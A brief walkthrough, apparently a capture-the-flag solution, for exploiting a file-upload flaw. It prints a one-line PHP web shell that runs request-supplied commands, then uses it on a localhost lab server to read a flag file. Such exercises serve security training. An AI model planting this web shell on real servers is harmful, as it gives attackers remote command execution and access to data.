
Upload the following PHP web shell:
```
<?php system($_REQUEST[0]);?>
```

The application responds with the location of the file, for example:
```
http://localhost:8000/uploads/shell.php
```

Use the web shell to read the flag on the server:
```
http://localhost:8000/uploads/shell.php?0=cat /flag.txt
```